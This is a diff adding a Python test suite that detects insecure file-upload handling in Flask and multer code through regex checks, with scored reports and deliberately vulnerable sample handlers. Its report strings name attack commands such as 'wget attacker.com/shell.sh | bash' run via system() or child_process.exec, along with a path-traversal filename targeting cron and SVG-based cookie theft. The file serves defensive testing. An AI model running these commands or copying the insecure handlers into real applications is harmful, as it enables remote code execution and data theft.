@@ -1,0 +1,708 @@
+"""
+Test suite for detecting Insecure File Upload vulnerabilities.
+"""
+import re
+from typing import Dict
+import sys
+from pathlib import Path
+
+# Add parent directory to path for utils import
+sys.path.insert(0, str(Path(__file__).parent.parent))
+from utils.code_locator import find_pattern_locations
+
+
+
+class FileUploadDetector:
+    """Detects insecure file upload vulnerabilities in code."""
+
+    def __init__(self):
+        self.vulnerabilities = []
+        self.score = 0
+
+    def analyze(self, code: str, language: str = "python") -> Dict:
+        """Analyze code for insecure file upload vulnerabilities."""
+        if language == "python":
+            return self._analyze_python(code)
+        elif language == "javascript":
+            return self._analyze_javascript(code)
+        else:
+            return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}
+
+    def _analyze_python(self, code: str) -> Dict:
+        """Analyze Python code for insecure file uploads."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Pattern 1: File upload handling
+        upload_patterns = [
+            r'\.save\(',  # Flask file.save()
+            r'open\([^)]*["\']wb["\']',  # Writing binary files
+            r'with\s+open\([^)]*["\']wb["\']',
+            r'\.write\(',
+            r'request\.files',
+        ]
+
+        # Find pattern locations
+        upload_locations = []
+        for pattern in upload_patterns:
+            upload_locations.extend(find_pattern_locations(code, pattern))
+
+        handles_upload = len(upload_locations) > 0
+
+        if handles_upload:
+            # Check if file content comes from user
+            has_user_file = any([
+                re.search(r'request\.files', code),
+                re.search(r'\.save\([^)]*\+', code),  # Saves with concatenated path
+                re.search(r'def\s+\w+\([^)]*file[^)]*\)', code),  # Function parameter
+            ])
+
+            if has_user_file:
+                # Check for security measures
+                has_extension_check = any([
+                    re.search(r'ALLOWED.*EXTENSIONS', code),
+                    re.search(r'if.*\.endswith\(', code),
+                    re.search(r'if.*\.suffix\s+in', code),
+                    re.search(r'if.*extension\s+in', code, re.IGNORECASE),
+                    re.search(r'allowed_file\(', code),
+                ])
+
+                has_mimetype_check = re.search(r'\.mimetype|\.content_type|magic\.|filetype\.', code, re.IGNORECASE)
+
+                has_size_limit = any([
+                    re.search(r'MAX.*SIZE|max.*size|MAX_CONTENT_LENGTH', code, re.IGNORECASE),
+                    re.search(r'\.content_length', code),
+                    re.search(r'if.*len\(.*\)\s*[<>]', code),
+                ])
+
+                has_filename_sanitization = any([
+                    re.search(r'secure_filename\(', code),
+                    re.search(r'os\.path\.basename\(', code),
+                    re.search(r're\.sub\(.*filename', code),
+                ])
+
+                # Score based on protections
+                missing_protections = []
+
+                if not has_extension_check:
+                    missing_protections.append("extension validation")
+
+                if not has_mimetype_check:
+                    missing_protections.append("MIME type verification")
+
+                if not has_size_limit:
+                    missing_protections.append("file size limits")
+
+                if not has_filename_sanitization:
+                    missing_protections.append("filename sanitization")
+
+                # Check for additional critical security issues
+                serves_uploaded_files = any([
+                    re.search(r'send_file|send_from_directory', code),
+                    re.search(r'/uploads/|/files/', code),
+                ])
+
+                stores_in_web_root = re.search(r'["\']uploads["\']|["\']static["\']|["\']files["\']', code)
+
+                missing_random_filename = not re.search(r'uuid|secrets\.token_hex|timestamp|random', code, re.IGNORECASE)
+
+                missing_authorization = not any([
+                    re.search(r'@login_required|@authenticate|current_user', code),
+                    re.search(r'if.*user|if.*auth', code),
+                ])
+
+                # Use first location for reporting
+                location = upload_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                # Build comprehensive vulnerability description
+                additional_risks = []
+                if serves_uploaded_files and stores_in_web_root:
+                    additional_risks.append("SERVES UPLOADED FILES FROM WEB ROOT → Content-type sniffing, stored XSS via SVG/HTML, direct script execution")
+                if missing_random_filename and stores_in_web_root:
+                    additional_risks.append("PREDICTABLE FILENAMES IN WEB ROOT → File enumeration, overwrites, race conditions, direct .php/.py execution")
+                if missing_authorization:
+                    additional_risks.append("NO AUTHORIZATION CHECKS → Unauthenticated upload/download, mass malware distribution")
+                if stores_in_web_root:
+                    additional_risks.append("FILES STORED IN WEB ROOT → Upload shell.php at /uploads/shell.php → RCE via direct web access")
+
+                if len(missing_protections) >= 3:
+                    # Critical: Missing 3+ protections
+                    description = f"File upload missing critical protections: {', '.join(missing_protections)}"
+                    description += " - SECURITY IMPACT: (1) Remote Code Execution: Upload shell.php to /uploads/ → Access https://site.com/uploads/shell.php → PHP executes → Full server compromise. (2) Stored XSS: Upload evil.svg with <script> → Victim views image → Session hijacking. (3) Malware Distribution: Upload ransomware.exe → Share link → Infect users. (4) Path Traversal: Filename='../../../../etc/cron.d/backdoor' → Overwrite system files. (5) DoS: Upload 10GB file → Disk exhaustion."
+
+                    if additional_risks:
+                        description += " || CRITICAL ARCHITECTURAL FLAWS: " + " || ".join(additional_risks)
+
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_UPLOAD",
+                        "severity": "CRITICAL",
+                        "description": description,
+                        "recommendation": "COMPLETE SECURITY OVERHAUL REQUIRED: (1) Extension whitelist (ONLY .jpg/.png/.pdf, BLOCK .php/.jsp/.aspx/.svg/.html), (2) MIME type verification via file magic bytes (import magic), (3) File size limits (app.config['MAX_CONTENT_LENGTH']), (4) RANDOM filenames (uuid.uuid4() + extension), (5) Store OUTSIDE web root (/var/app_data/uploads NOT /var/www/uploads), (6) Serve via @app.route with send_file() + Content-Disposition: attachment, (7) Authorization checks (@login_required + verify user owns file), (8) Virus scanning (ClamAV integration), (9) Separate domain/CDN for user content (user-content.example.com not example.com), (10) Content-Type: application/octet-stream header to prevent browser execution",
+                        "example_attack": "Attacker uploads malicious.php to /var/www/html/uploads/ → Visits https://victim.com/uploads/malicious.php → Webserver executes PHP → system('wget attacker.com/shell.sh | bash') → Full compromise. OR: Upload evil.svg with embedded JavaScript → Served as image/svg+xml → XSS executes in victim browser → document.cookie sent to attacker",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability occurs when user-uploaded files are not properly validated",
+                                "Missing 3+ critical protections: extension validation, MIME type verification, size limits, or filename sanitization",
+                                "Storing files in web-accessible directories without random filenames",
+                                "Serving uploaded files directly without Content-Disposition headers",
+                                "No authorization checks on upload/download operations"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: File upload operation detected with CRITICAL security gaps",
+                                f"Missing protections: {', '.join(missing_protections)}",
+                                f"Additional risks found: {', '.join(additional_risks) if additional_risks else 'None'}",
+                                "ATTACK: Attacker can upload shell.php with malicious code, access it via web URL, execute arbitrary commands on the server",
+                                "ATTACK: Upload evil.svg containing <script> tags, when viewed by victim triggers XSS and steals session cookies",
+                                "ATTACK: Upload file with path traversal name like '../../../../etc/cron.d/backdoor' to overwrite system files",
+                                "ATTACK: Upload massive file (10GB+) to exhaust disk space causing denial of service",
+                                "IMPACT: Complete server compromise via RCE, XSS attacks, malware distribution, DoS, data theft"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "File upload operations: .save(), open() with 'wb', .write(), request.files",
+                                "Extension validation: ALLOWED_EXTENSIONS, .endswith(), .suffix in, allowed_file()",
+                                "MIME type verification: .mimetype, .content_type, magic., filetype.",
+                                "File size limits: MAX_SIZE, MAX_CONTENT_LENGTH, .content_length, len() checks",
+                                "Filename sanitization: secure_filename(), os.path.basename(), re.sub() on filename",
+                                "File serving: send_file, send_from_directory, /uploads/, /files/ routes",
+                                "Storage location: 'uploads', 'static', 'files' directories (web root indicators)",
+                                "Random filenames: uuid, secrets.token_hex, timestamp, random",
+                                "Authorization: @login_required, @authenticate, current_user, if user/auth checks"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}",
+                                    f"Missing: {', '.join(missing_protections)}"
+                                ] + (additional_risks if additional_risks else []),
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 0
+                elif len(missing_protections) >= 1:
+                    # Medium: Missing 1-2 protections
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_UPLOAD",
+                        "severity": "MEDIUM",
+                        "description": f"File upload missing protections: {', '.join(missing_protections)}",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability occurs when user-uploaded files are not properly validated",
+                                "Missing 1-2 protections reduces security but some defenses are present",
+                                "Partial protection leaves gaps that can be exploited under certain conditions"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: File upload operation with partial security measures",
+                                f"Missing protections: {', '.join(missing_protections)}",
+                                f"Found protections: {', '.join([p for p in ['extension validation', 'MIME type verification', 'file size limits', 'filename sanitization'] if p not in missing_protections])}",
+                                "ATTACK: Depending on missing protections, attackers may still exploit gaps",
+                                "IMPACT: Reduced but not eliminated risk of RCE, XSS, DoS, or malware distribution"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "File upload operations: .save(), open() with 'wb', .write(), request.files",
+                                "Extension validation: ALLOWED_EXTENSIONS, .endswith(), .suffix in, allowed_file()",
+                                "MIME type verification: .mimetype, .content_type, magic., filetype.",
+                                "File size limits: MAX_SIZE, MAX_CONTENT_LENGTH, .content_length, len() checks",
+                                "Filename sanitization: secure_filename(), os.path.basename(), re.sub() on filename",
+                                "File serving: send_file, send_from_directory, /uploads/, /files/ routes",
+                                "Storage location: 'uploads', 'static', 'files' directories",
+                                "Random filenames: uuid, secrets.token_hex, timestamp, random",
+                                "Authorization: @login_required, @authenticate, current_user"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}",
+                                    f"Missing: {', '.join(missing_protections)}"
+                                ],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 1
+                else:
+                    # All protections present
+                    self.vulnerabilities.append({
+                        "type": "SECURE",
+                        "severity": "INFO",
+                        "description": "File upload has proper validation (extension, MIME type, size, filename sanitization)",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability occurs when user-uploaded files are not properly validated",
+                                "Secure upload requires: extension validation, MIME type verification, size limits, and filename sanitization",
+                                "All four critical protections must be present for secure file handling"
+                            ],
+                            "why_vulnerable": [],
+                            "why_not_vulnerable": [
+                                f"Line {line_num}: File upload operation with ALL security protections in place",
+                                "Found: Extension validation restricting allowed file types",
+                                "Found: MIME type verification checking actual file content",
+                                "Found: File size limits preventing DoS attacks",
+                                "Found: Filename sanitization preventing path traversal",
+                                "All four critical protections are implemented correctly"
+                            ],
+                            "patterns_checked": [
+                                "File upload operations: .save(), open() with 'wb', .write(), request.files",
+                                "Extension validation: ALLOWED_EXTENSIONS, .endswith(), .suffix in, allowed_file()",
+                                "MIME type verification: .mimetype, .content_type, magic., filetype.",
+                                "File size limits: MAX_SIZE, MAX_CONTENT_LENGTH, .content_length, len() checks",
+                                "Filename sanitization: secure_filename(), os.path.basename(), re.sub() on filename",
+                                "File serving: send_file, send_from_directory",
+                                "Storage location: checked for web root storage",
+                                "Random filenames: uuid, secrets.token_hex, timestamp, random",
+                                "Authorization: @login_required, @authenticate, current_user"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}",
+                                    "Extension validation found",
+                                    "MIME type verification found",
+                                    "File size limits found",
+                                    "Filename sanitization found"
+                                ],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_javascript(self, code: str) -> Dict:
+        """Analyze JavaScript code for insecure file uploads."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Pattern 1: File upload handling (multer, express-fileupload, etc.)
+        upload_patterns = [
+            r'multer\(',
+            r'upload\.(single|array|fields)',
+            r'express-fileupload',
+            r'formidable',
+            r'busboy',
+            r'req\.files',
+            r'fs\.writeFile',
+        ]
+
+        # Find pattern locations
+        upload_locations = []
+        for pattern in upload_patterns:
+            upload_locations.extend(find_pattern_locations(code, pattern))
+
+        handles_upload = len(upload_locations) > 0
+
+        if handles_upload:
+            # Check if file content comes from user
+            has_user_file = any([
+                re.search(r'req\.file|req\.files', code),
+                re.search(r'multer\(', code),
+                re.search(r'\.mv\(|\.write\(', code),
+            ])
+
+            if has_user_file:
+                # Check for security measures
+                has_extension_check = any([
+                    re.search(r'allowedExtensions|ALLOWED.*EXT', code, re.IGNORECASE),
+                    re.search(r'\.endsWith\(', code),
+                    re.search(r'if.*extension', code, re.IGNORECASE),
+                    re.search(r'fileFilter', code),
+                ])
+
+                has_mimetype_check = any([
+                    re.search(r'\.mimetype', code),
+                    re.search(r'file-type', code),
+                    re.search(r'mime\.', code),
+                ])
+
+                # Check for DANGEROUS MIME types that should be blocked
+                has_dangerous_mime_types = any([
+                    re.search(r'image/svg\+xml', code),  # SVG can contain XSS
+                    re.search(r'text/html', code),  # HTML files = XSS
+                    re.search(r'application/zip', code),  # ZIP can contain executables
+                    re.search(r'application/x-', code),  # Executable MIME types
+                    re.search(r'text/javascript', code),  # JavaScript files
+                ])
+
+                # Check for MIME-only validation (vulnerable to spoofing)
+                # CRITICAL: If code checks mimetype WITHOUT extension check = spoofing risk
+                # If both extension + mimetype are checked, it's defense in depth (not critical)
+                has_magic_byte_verification = re.search(r'file-type|magic|fromBuffer', code, re.IGNORECASE)
+                has_mime_check_only = (re.search(r'\.mimetype', code) and
+                                      not has_magic_byte_verification and
+                                      not has_extension_check)
+
+                # Check for INFINITE or missing file size limits
+                has_infinite_size_limit = re.search(r'Infinity|Number\.MAX_SAFE_INTEGER', code)
+                has_conditional_size_limit = re.search(r'if.*enterprise|if.*premium|if.*admin', code) and has_infinite_size_limit
+
+                has_size_limit = any([
+                    re.search(r'limits:\s*\{', code),
+                    re.search(r'fileSize:', code),
+                    re.search(r'\.size\s*[<>]', code),
+                ]) and not has_infinite_size_limit and not has_conditional_size_limit
+
+                has_filename_sanitization = any([
+                    re.search(r'sanitize.*filename', code, re.IGNORECASE),
+                    re.search(r'path\.basename\(', code),
+                    re.search(r'\.replace\([^)]*filename', code),
+                ])
+
+                # Score based on protections
+                missing_protections = []
+                critical_vulnerabilities = []
+
+                # Check for CRITICAL vulnerabilities that override other checks
+                if has_dangerous_mime_types:
+                    critical_vulnerabilities.append("ALLOWS DANGEROUS FILE TYPES (SVG with XSS, ZIP with malware, HTML, executables)")
+
+                if has_mime_check_only:
+                    critical_vulnerabilities.append("MIME SPOOFING VULNERABILITY (trusts user-supplied mimetype without magic byte verification - attacker can bypass by setting Content-Type header)")
+
+                if has_conditional_size_limit or has_infinite_size_limit:
+                    critical_vulnerabilities.append("INFINITE FILE SIZE LIMIT (allows DoS via massive file uploads)")
+
+                # Regular missing protections
+                if not has_extension_check:
+                    missing_protections.append("extension validation")
+
+                if not has_mimetype_check:
+                    missing_protections.append("MIME type verification")
+
+                if not has_size_limit:
+                    missing_protections.append("file size limits")
+
+                if not has_filename_sanitization:
+                    missing_protections.append("filename sanitization")
+
+                # Check for additional critical security issues
+                serves_uploaded_files = any([
+                    re.search(r'res\.sendFile|express\.static|app\.use.*uploads', code),
+                    re.search(r'/uploads/|/files/', code),
+                ])
+
+                stores_in_web_root = re.search(r'["\']uploads["\']|["\']public["\']|["\']static["\']|["\']files["\']', code)
+
+                missing_random_filename = not re.search(r'uuid|crypto\.randomBytes|Date\.now|Math\.random', code, re.IGNORECASE)
+
+                missing_authorization = not any([
+                    re.search(r'isAuthenticated|requireAuth|authMiddleware|checkAuth', code),
+                    re.search(r'if.*req\.user|if.*req\.session', code),
+                ])
+
+                # Use first location for reporting
+                location = upload_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                # Build comprehensive vulnerability description
+                additional_risks = []
+                if serves_uploaded_files and stores_in_web_root:
+                    additional_risks.append("SERVES UPLOADED FILES FROM WEB ROOT → Content-type sniffing, stored XSS via SVG/HTML, direct script execution")
+                if missing_random_filename and stores_in_web_root:
+                    additional_risks.append("PREDICTABLE FILENAMES IN WEB ROOT → File enumeration, overwrites, race conditions, direct .php/.jsp execution")
+                if missing_authorization:
+                    additional_risks.append("NO AUTHORIZATION CHECKS → Unauthenticated upload/download, mass malware distribution")
+                if stores_in_web_root:
+                    additional_risks.append("FILES STORED IN WEB ROOT → Upload shell.php at /uploads/shell.php → RCE via direct web access")
+
+                # CRITICAL VULNERABILITIES = automatic FAIL (score 0)
+                if len(critical_vulnerabilities) > 0 or len(missing_protections) >= 3:
+                    # Critical: Has critical vulnerabilities OR missing 3+ protections
+                    description_parts = []
+
+                    if critical_vulnerabilities:
+                        description_parts.append(f"CRITICAL VULNERABILITIES: {', '.join(critical_vulnerabilities)}")
+
+                    if missing_protections:
+                        description_parts.append(f"Missing protections: {', '.join(missing_protections)}")
+
+                    description = " || ".join(description_parts)
+                    description += " - SECURITY IMPACT: (1) Remote Code Execution: Upload shell.jsp to /uploads/ → Access https://site.com/uploads/shell.jsp → Server executes → Full compromise. (2) Stored XSS: Upload evil.svg with <script> → Victim views image → Session hijacking. (3) MIME Spoofing: Set Content-Type: image/png on shell.jsp → Bypass validation. (4) Malware Distribution: Upload ransomware.exe in .zip → Share link → Infect users. (5) DoS: Upload 999GB file (enterprise user) → Disk exhaustion."
+
+                    if additional_risks:
+                        description += " || CRITICAL ARCHITECTURAL FLAWS: " + " || ".join(additional_risks)
+
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_UPLOAD",
+                        "severity": "CRITICAL",
+                        "description": description,
+                        "recommendation": "COMPLETE SECURITY OVERHAUL REQUIRED: (1) Extension whitelist (ONLY .jpg/.png/.pdf, BLOCK .php/.jsp/.aspx/.svg/.html), (2) MIME type verification via file magic bytes (require('file-type')), (3) File size limits (multer limits.fileSize), (4) RANDOM filenames (uuid.v4() + extension), (5) Store OUTSIDE web root (/var/app_data/uploads NOT /var/www/uploads), (6) Serve via route with res.download() + Content-Disposition: attachment, (7) Authorization checks (authMiddleware + verify user owns file), (8) Virus scanning (ClamAV integration), (9) Separate domain/CDN for user content (user-content.example.com not example.com), (10) Content-Type: application/octet-stream header to prevent browser execution",
+                        "example_attack": "Attacker uploads malicious.jsp to /var/www/html/uploads/ → Visits https://victim.com/uploads/malicious.jsp → Application server executes JSP → require('child_process').exec('wget attacker.com/shell.sh | bash') → Full compromise. OR: Upload evil.svg with embedded JavaScript → Served as image/svg+xml → XSS executes in victim browser → document.cookie sent to attacker",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability in JavaScript occurs when user-uploaded files are not properly validated",
+                                "CRITICAL flaws include: allowing dangerous MIME types (SVG/HTML/ZIP), MIME spoofing, infinite file size limits",
+                                "Missing 3+ protections: extension validation, MIME type verification, size limits, or filename sanitization",
+                                "Architectural risks: storing in web root, serving without authorization, predictable filenames"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: File upload operation with CRITICAL JavaScript-specific vulnerabilities",
+                                f"Critical vulnerabilities: {', '.join(critical_vulnerabilities) if critical_vulnerabilities else 'None'}",
+                                f"Missing protections: {', '.join(missing_protections)}",
+                                f"Additional risks: {', '.join(additional_risks) if additional_risks else 'None'}",
+                                "ATTACK: Upload shell.jsp with malicious code, set Content-Type: image/png to spoof MIME check, access via URL for RCE",
+                                "ATTACK: Upload evil.svg with <script> tags, when served as image/svg+xml triggers XSS and steals cookies",
+                                "ATTACK: Upload massive ZIP file (999GB) using enterprise account with infinite size limit, exhaust disk space",
+                                "ATTACK: Upload file with predictable name to web root, enumerate and access other user files",
+                                "IMPACT: Complete server compromise via RCE, XSS attacks, MIME spoofing, malware distribution, DoS"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "File upload operations: multer(), upload.single/array/fields, req.files, fs.writeFile",
+                                "Extension validation: allowedExtensions, .endsWith(), fileFilter",
+                                "MIME type verification: .mimetype, file-type, mime., magic byte checks",
+                                "Dangerous MIME types: image/svg+xml, text/html, application/zip, application/x-*, text/javascript",
+                                "MIME spoofing: mimetype check without magic byte verification",
+                                "File size limits: limits.fileSize, .size checks, Infinity, MAX_SAFE_INTEGER",
+                                "Conditional limits: if enterprise/premium/admin with Infinity",
+                                "Filename sanitization: sanitize-filename, path.basename(), .replace() on filename",
+                                "File serving: res.sendFile, express.static, app.use with uploads",
+                                "Storage location: 'uploads', 'public', 'static', 'files' directories",
+                                "Random filenames: uuid, crypto.randomBytes, Date.now, Math.random",
+                                "Authorization: isAuthenticated, requireAuth, authMiddleware, req.user/session checks"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}"
+                                ] + ([f"Critical: {c}" for c in critical_vulnerabilities] if critical_vulnerabilities else []) + ([f"Missing: {', '.join(missing_protections)}"] if missing_protections else []) + (additional_risks if additional_risks else []),
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 0
+                elif len(missing_protections) >= 1:
+                    # Medium: Missing 1-2 protections
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_UPLOAD",
+                        "severity": "MEDIUM",
+                        "description": f"File upload missing protections: {', '.join(missing_protections)}",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability in JavaScript occurs when user-uploaded files are not properly validated",
+                                "Missing 1-2 protections reduces security but some defenses are present",
+                                "Partial protection leaves gaps that can be exploited under certain conditions"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: File upload operation with partial security measures in JavaScript",
+                                f"Missing protections: {', '.join(missing_protections)}",
+                                f"Found protections: {', '.join([p for p in ['extension validation', 'MIME type verification', 'file size limits', 'filename sanitization'] if p not in missing_protections])}",
+                                "ATTACK: Depending on missing protections, attackers may still exploit gaps",
+                                "IMPACT: Reduced but not eliminated risk of RCE, XSS, DoS, or malware distribution"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "File upload operations: multer(), upload.single/array/fields, req.files, fs.writeFile",
+                                "Extension validation: allowedExtensions, .endsWith(), fileFilter",
+                                "MIME type verification: .mimetype, file-type, mime.",
+                                "File size limits: limits.fileSize, .size checks",
+                                "Filename sanitization: sanitize-filename, path.basename(), .replace()",
+                                "File serving: res.sendFile, express.static",
+                                "Storage location: 'uploads', 'public', 'static' directories",
+                                "Random filenames: uuid, crypto.randomBytes, Date.now, Math.random",
+                                "Authorization: isAuthenticated, requireAuth, authMiddleware"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}",
+                                    f"Missing: {', '.join(missing_protections)}"
+                                ],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 1
+                else:
+                    # All protections present
+                    self.vulnerabilities.append({
+                        "type": "SECURE",
+                        "severity": "INFO",
+                        "description": "File upload has proper validation (extension, MIME type, size, filename sanitization)",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "File upload vulnerability in JavaScript occurs when user-uploaded files are not properly validated",
+                                "Secure upload requires: extension validation, MIME type verification, size limits, and filename sanitization",
+                                "All four critical protections must be present for secure file handling"
+                            ],
+                            "why_vulnerable": [],
+                            "why_not_vulnerable": [
+                                f"Line {line_num}: File upload operation with ALL security protections in place",
+                                "Found: Extension validation using fileFilter or allowedExtensions",
+                                "Found: MIME type verification checking file.mimetype",
+                                "Found: File size limits preventing DoS attacks",
+                                "Found: Filename sanitization preventing path traversal",
+                                "All four critical protections are implemented correctly"
+                            ],
+                            "patterns_checked": [
+                                "File upload operations: multer(), upload.single/array/fields, req.files, fs.writeFile",
+                                "Extension validation: allowedExtensions, .endsWith(), fileFilter",
+                                "MIME type verification: .mimetype, file-type, mime.",
+                                "File size limits: limits.fileSize, .size checks",
+                                "Filename sanitization: sanitize-filename, path.basename(), .replace()",
+                                "File serving: res.sendFile, express.static",
+                                "Storage location: checked for web root storage",
+                                "Random filenames: uuid, crypto.randomBytes, Date.now, Math.random",
+                                "Authorization: isAuthenticated, requireAuth, authMiddleware"
+                            ],
+                            "evidence": {
+                                "found_patterns": [
+                                    f"File upload operation at line {line_num}",
+                                    "Extension validation found",
+                                    "MIME type verification found",
+                                    "File size limits found",
+                                    "Filename sanitization found"
+                                ],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+
+def test_upload_python_vulnerable():
+    """Test detection of insecure file upload in Python."""
+    vulnerable_code = '''
+from flask import Flask, request
+import os
+
+app = Flask(__name__)
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    file = request.files['file']
+    filename = file.filename
+    file.save(os.path.join('uploads', filename))
+    return 'File uploaded'
+'''
+    detector = FileUploadDetector()
+    result = detector.analyze(vulnerable_code, "python")
+    assert result["score"] == 0, "Should detect insecure file upload"
+
+
+def test_upload_python_secure():
+    """Test detection of secure file upload with validations."""
+    secure_code = '''
+from flask import Flask, request
+from werkzeug.utils import secure_filename
+import os
+import magic
+
+app = Flask(__name__)
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB limit
+ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    file = request.files['file']
+
+    if not file or not allowed_file(file.filename):
+        return 'Invalid file type', 400
+
+    # Check MIME type
+    mime = magic.from_buffer(file.read(1024), mime=True)
+    file.seek(0)
+
+    if mime not in ['image/png', 'image/jpeg', 'application/pdf']:
+        return 'Invalid file', 400
+
+    filename = secure_filename(file.filename)
+    file.save(os.path.join('uploads', filename))
+    return 'File uploaded'
+'''
+    detector = FileUploadDetector()
+    result = detector.analyze(secure_code, "python")
+    assert result["score"] == 2, "Should recognize secure file upload"
+
+
+def test_upload_javascript_vulnerable():
+    """Test detection of insecure file upload in JavaScript."""
+    vulnerable_code = '''
+const multer = require('multer');
+const upload = multer({ dest: 'uploads/' });
+
+app.post('/upload', upload.single('file'), (req, res) => {
+    const file = req.file;
+    res.send('File uploaded');
+});
+'''
+    detector = FileUploadDetector()
+    result = detector.analyze(vulnerable_code, "javascript")
+    assert result["score"] == 0, "Should detect insecure file upload"
+
+
+def test_upload_javascript_secure():
+    """Test detection of secure file upload in JavaScript."""
+    secure_code = '''
+const multer = require('multer');
+const path = require('path');
+
+const ALLOWED_EXTENSIONS = ['.jpg', '.png', '.pdf'];
+
+const storage = multer.diskStorage({
+    destination: 'uploads/',
+    filename: (req, file, cb) => {
+        cb(null, path.basename(file.originalname));
+    }
+});
+
+const upload = multer({
+    storage: storage,
+    limits: { fileSize: 16 * 1024 * 1024 },
+    fileFilter: (req, file, cb) => {
+        const ext = path.extname(file.originalname);
+        if (!ALLOWED_EXTENSIONS.includes(ext)) {
+            return cb(new Error('Invalid file type'));
+        }
+        // Check mimetype
+        if (!file.mimetype.startsWith('image/') && file.mimetype !== 'application/pdf') {
+            return cb(new Error('Invalid MIME type'));
+        }
+        cb(null, true);
+    }
+});
+
+app.post('/upload', upload.single('file'), (req, res) => {
+    res.send('File uploaded');
+});
+'''
+    detector = FileUploadDetector()
+    result = detector.analyze(secure_code, "javascript")
+    assert result["score"] == 2, "Should recognize secure file upload"
+
+
+if __name__ == "__main__":
+    test_upload_python_vulnerable()
+    test_upload_python_secure()
+    test_upload_javascript_vulnerable()
+    test_upload_javascript_secure()
+    print("✅ All File Upload detection tests passed!")
